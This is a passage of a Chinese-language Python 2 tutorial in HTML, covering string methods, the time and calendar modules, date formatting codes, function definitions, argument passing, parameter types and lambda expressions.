href="https://www.runoob.com/python/att-string-format.html">string.format()</a></strong></td><td align="left">格式化字符串</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-index.html">string.index(str, beg&#x3D;0, end&#x3D;len(string))</a></strong></td><td align="left">跟find()方法一样，只不过如果str不在 string中会报一个异常.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isalnum.html">string.isalnum()</a></td><td align="left">如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True,否则返回 False</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isalpha.html">string.isalpha()</a></td><td align="left">如果 string 至少有一个字符并且所有字符都是字母则返回 True,否则返回 False</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isdecimal.html">string.isdecimal()</a></td><td align="left">如果 string 只包含十进制数字则返回 True 否则返回 False.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isdigit.html">string.isdigit()</a></td><td align="left">如果 string 只包含数字则返回 True 否则返回 False.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-islower.html">string.islower()</a></td><td align="left">如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isnumeric.html">string.isnumeric()</a></td><td align="left">如果 string 中只包含数字字符，则返回 True，否则返回 False</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isspace.html">string.isspace()</a></td><td align="left">如果 string 中只包含空格，则返回 True，否则返回 False.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-istitle.html">string.istitle()</a></td><td align="left">如果 string 是标题化的(见 title())则返回 True，否则返回 False</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-isupper.html">string.isupper()</a></td><td align="left">如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-join.html">string.join(seq)</a></strong></td><td align="left">以 string 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-ljust.html">string.ljust(width)</a></td><td align="left">返回一个原字符串左对齐,并使用空格填充至长度 width 的新字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-lower.html">string.lower()</a></td><td align="left">转换 string 中所有大写字符为小写.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-lstrip.html">string.lstrip()</a></td><td align="left">截掉 string 左边的空格</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-maketrans.html">string.maketrans(intab, outtab)</a></td><td align="left">maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-max.html">max(str)</a></td><td align="left">返回字符串 <em>str</em> 中最大的字母。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-min.html">min(str)</a></td><td align="left">返回字符串 <em>str</em> 中最小的字母。</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-partition.html">string.partition(str)</a></strong></td><td align="left">有点像 find()和 split()的结合体,从 str 出现的第一个位置起,把 字 符 串 string 分 成 一 个 3 元 素 的 元 组 (string_pre_str,str,string_post_str),如果 string 中不包含str 则 string_pre_str &#x3D;&#x3D; string.</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-replace.html">string.replace(str1, str2, num&#x3D;string.count(str1))</a></strong></td><td align="left">把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-rfind.html">string.rfind(str, beg&#x3D;0,end&#x3D;len(string) )</a></td><td align="left">类似于 find() 函数，返回字符串最后一次出现的位置，如果没有匹配项则返回 -1。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-rindex.html">string.rindex( str, beg&#x3D;0,end&#x3D;len(string))</a></td><td align="left">类似于 index()，不过是返回最后一个匹配到的子字符串的索引号。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-rjust.html">string.rjust(width)</a></td><td align="left">返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-rpartition.html">string.rpartition(str)</a></td><td align="left">类似于 partition()函数,不过是从右边开始查找</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-rstrip.html">string.rstrip()</a></td><td align="left">删除 string 字符串末尾的空格.</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-split.html">string.split(str&#x3D;””, num&#x3D;string.count(str))</a></strong></td><td align="left">以 str 为分隔符切片 string，如果 num 有指定值，则仅分隔 <strong>num+1</strong> 个子字符串</td></tr><tr><td align="left">[string.splitlines(<a href="https://www.runoob.com/python/att-string-splitlines.html">keepends])</a></td><td align="left">按照行(‘\r’, ‘\r\n’, ‘\n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-startswith.html">string.startswith(obj, beg&#x3D;0,end&#x3D;len(string))</a></td><td align="left">检查字符串是否是以 obj 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查.</td></tr><tr><td align="left"><strong>[string.strip(<a href="https://www.runoob.com/python/att-string-strip.html">obj])</a></strong></td><td align="left">在 string 上执行 lstrip()和 rstrip()</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-swapcase.html">string.swapcase()</a></td><td align="left">翻转 string 中的大小写</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-title.html">string.title()</a></td><td align="left">返回”标题化”的 string,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-translate.html">string.translate(str, del&#x3D;””)</a></strong></td><td align="left">根据 str 给出的表(包含 256 个字符)转换 string 的字符,要过滤掉的字符放到 del 参数中</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-upper.html">string.upper()</a></td><td align="left">转换 string 中的小写字母为大写</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-zfill.html">string.zfill(width)</a></td><td align="left">返回长度为 width 的字符串，原字符串 string 右对齐，前面填充0</td></tr></tbody></table><h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>时间间隔是以秒为单位的浮点小数。每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示。</p><p> time 模块下有很多函数可以转换常见日期格式。如函数time.time()用于获取当前时间戳，最适于做日期运算。但是1970年之前的日期就无法以此表示了。太遥远的日期也不行，UNIX和Windows只支持到2038年。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> time  <span class="comment"># 引入time模块</span></span><br><span class="line"> </span><br><span class="line">ticks = time.time()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;当前时间戳为:&quot;</span>, ticks</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前时间戳为: <span class="number">1459994552.51</span></span><br></pre></td></tr></table></figure><h3 id="时间元组"><a href="#时间元组" class="headerlink" title="时间元组"></a>时间元组</h3><p>很多Python函数用一个元组装起来的9组数字处理时间。</p><h4 id="struct-time元组"><a href="#struct-time元组" class="headerlink" title="struct_time元组"></a>struct_time元组</h4><table><thead><tr><th align="left">序号</th><th align="left">字段</th><th>属性</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4位数年</td><td>tm_year</td><td align="left">2008</td></tr><tr><td align="left">1</td><td align="left">月</td><td>tm_mon</td><td align="left">1 到 12</td></tr><tr><td align="left">2</td><td align="left">日</td><td>tm_mday</td><td align="left">1到31</td></tr><tr><td align="left">3</td><td align="left">小时</td><td>tm_hour</td><td align="left">0到23</td></tr><tr><td align="left">4</td><td align="left">分钟</td><td>tm_min</td><td align="left">0到59</td></tr><tr><td align="left">5</td><td align="left">秒</td><td>tm_sec</td><td align="left">0到61 (60或61 是闰秒)</td></tr><tr><td align="left">6</td><td align="left">一周的第几日</td><td>tm_wday</td><td align="left">0到6 (0是周一)</td></tr><tr><td align="left">7</td><td align="left">一年的第几日</td><td>tm_yday</td><td align="left">1到366 (儒略历)</td></tr><tr><td align="left">8</td><td align="left">夏令时</td><td>tm_isdst</td><td align="left">-1, 0, 1, -1是决定是否为夏令时的旗帜</td></tr></tbody></table><h3 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h3><p>最简单的获取可读的时间模式的函数是asctime()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">localtime = time.asctime( time.localtime(time.time()) )</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;本地时间为 :&quot;</span>, localtime</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地时间为 : Thu Mar 17 23:05:21 2024</span><br></pre></td></tr></table></figure><h3 id="格式化日期"><a href="#格式化日期" class="headerlink" title="格式化日期"></a>格式化日期</h3><p>可以使用 time 模块的 strftime 方法来格式化日期</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(<span class="built_in">format</span>[, t])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line"># 格式化成2022-03-16 11:45:39形式</span><br><span class="line">print time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) </span><br><span class="line"> </span><br><span class="line"># 格式化成Sat Mar 16 22:24:24 2024形式</span><br><span class="line">print time.strftime(&quot;%a %b %d %H:%M:%S %Y&quot;, time.localtime()) </span><br><span class="line">  </span><br><span class="line"># 将格式字符串转换为时间戳</span><br><span class="line">a = &quot;Sat Mar 16 22:24:24 2024&quot;</span><br><span class="line">print time.mktime(time.strptime(a,&quot;%a %b %d %H:%M:%S %Y&quot;))</span><br></pre></td></tr></table></figure><p>时间日期格式化符号：</p><ul><li>%y 两位数的年份表示（00-99）</li><li>%Y 四位数的年份表示（000-9999）</li><li>%m 月份（01-12）</li><li>%d 月内中的一天（0-31）</li><li>%H 24小时制小时数（0-23）</li><li>%I 12小时制小时数（01-12）</li><li>%M 分钟数（00-59）</li><li>%S 秒（00-59）</li><li>%a 本地简化星期名称</li><li>%A 本地完整星期名称</li><li>%b 本地简化的月份名称</li><li>%B 本地完整的月份名称</li><li>%c 本地相应的日期表示和时间表示</li><li>%j 年内的一天（001-366）</li><li>%p 本地A.M.或P.M.的等价符</li><li>%U 一年中的星期数（00-53）星期天为星期的开始</li><li>%w 星期（0-6），星期天为星期的开始</li><li>%W 一年中的星期数（00-53）星期一为星期的开始</li><li>%x 本地相应的日期表示</li><li>%X 本地相应的时间表示</li><li>%Z 当前时区的名称</li><li>%% %号本身</li></ul><h3 id="获取某月日历"><a href="#获取某月日历" class="headerlink" title="获取某月日历"></a>获取某月日历</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"> </span><br><span class="line">cal = calendar.month(<span class="number">2016</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;以下输出2024年3月份的日历:&quot;</span></span><br><span class="line"><span class="built_in">print</span> cal</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下输出<span class="number">2024</span>年<span class="number">3</span>月份的日历:</span><br><span class="line">    March <span class="number">2024</span></span><br><span class="line">Mo Tu We Th Fr Sa Su</span><br><span class="line">             <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line"> <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span></span><br><span class="line"><span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span></span><br><span class="line"><span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><ul><li>函数代码块以 <strong>def</strong> 关键词开头，后接函数标识符名称和圆括号**()**。</li><li>任何传入参数和自变量必须放在圆括号中间。圆括号之间可以用于定义参数。</li><li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li><li>函数内容以冒号起始，并且缩进。</li><li><strong>return [表达式]</strong> 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">functionname</span>(<span class="params"> parameters </span>):</span><br><span class="line">   <span class="string">&quot;函数_文档字符串&quot;</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printme</span>(<span class="params"> <span class="built_in">str</span> </span>):</span><br><span class="line">   <span class="string">&quot;打印传入的字符串到标准显示设备上&quot;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="built_in">str</span></span><br><span class="line">   <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p><strong>可更改(mutable)与不可更改(immutable)对象</strong></p><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p><ul><li><strong>不可变类型：</strong>变量赋值 <strong>a&#x3D;5</strong> 后再赋值 <strong>a&#x3D;10</strong>，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。</li><li><strong>可变类型：</strong>变量赋值 <strong>la&#x3D;[1,2,3,4]</strong> 后再赋值 <strong>la[2]&#x3D;5</strong> 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</li></ul><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><ul><li><strong>不可变类型：</strong>类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</li><li><strong>可变类型：</strong>类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</li></ul><p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p><h5 id="传不可变对象"><a href="#传不可变对象" class="headerlink" title="传不可变对象"></a>传不可变对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ChangeInt</span>(<span class="params"> a </span>):</span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line"><span class="built_in">print</span> b <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure><p> int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a&#x3D;10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p><h5 id="传可变对象"><a href="#传可变对象" class="headerlink" title="传可变对象"></a>传可变对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeme</span>(<span class="params"> mylist </span>):</span><br><span class="line">   <span class="string">&quot;修改传入的列表&quot;</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;函数内取值: &quot;</span>, mylist</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;函数外取值: &quot;</span>, mylist</span><br></pre></td></tr></table></figure><p>传入函数的和在末尾添加新内容的对象用的是同一个引用，故输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数内取值:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">函数外取值:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>调用函数时可使用的正式参数类型：必备参数、关键字参数、默认参数、不定长参数</p><h4 id="必备参数"><a href="#必备参数" class="headerlink" title="必备参数"></a>必备参数</h4><p>必备参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。调用printme()函数，必须传入一个参数，不然会出现语法错误。</p><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p><p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params"> name, age </span>):</span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Name: &quot;</span>, name</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Age &quot;</span>, age</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;miki&quot;</span> )</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:  miki</span><br><span class="line">Age  <span class="number">50</span></span><br></pre></td></tr></table></figure><p>默认参数</p><p>调用函数时，默认参数的值如果没有传入，则被认为是默认值。下例会打印默认的age，如果age没有被传入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params"> name, age = <span class="number">35</span> </span>):</span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Name: &quot;</span>, name</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Age &quot;</span>, age</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;miki&quot;</span> )</span><br><span class="line">printinfo( name=<span class="string">&quot;miki&quot;</span> )<span class="comment">#默认参数的值如果没有传入则被认为是默认值</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name:  miki</span><br><span class="line">Age  <span class="number">50</span></span><br><span class="line">Name:  miki</span><br><span class="line">Age  <span class="number">35</span></span><br></pre></td></tr></table></figure><h4 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h4><p>需要一个函数能处理比当初声明时更多的参数时，这些参数叫做不定长参数，和上述2种参数不同，声明时不会命名。</p><p>语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">functionname</span>(<span class="params">[formal_args,] *var_args_tuple </span>):</span><br><span class="line">   <span class="string">&quot;函数_文档字符串&quot;</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params"> arg1, *vartuple </span>):</span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;输出: &quot;</span></span><br><span class="line">   <span class="built_in">print</span> arg1</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="built_in">print</span> var</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输出:</span><br><span class="line"><span class="number">10</span></span><br><span class="line">输出:</span><br><span class="line"><span class="number">70</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure><h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p>使用 lambda 来创建匿名函数。</p><ul><li>lambda只是一个表达式，函数体比def简单很多。</li><li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li><li>lambda函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。</li><li>虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li></ul><p><strong>语法</strong></p><p>lambda函数的语法只包含一个语句，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">20</span>, <span class="number">20</span> )</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">相加后的值为 :  30</span><br><span class="line">相加后的值为 :  40</span><br></pre></td></tr></table></figure><h4 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句"></a>return 语句</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum</span>(<span class="params"> arg1, arg2 </span>):</span><br><span class="line">   <span class="comment"># 返回2个参数的和.&quot;</span></span><br><span class="line">   total = arg1 + arg2</span><br><span class="line">   <span class="built_in">print</span> <span 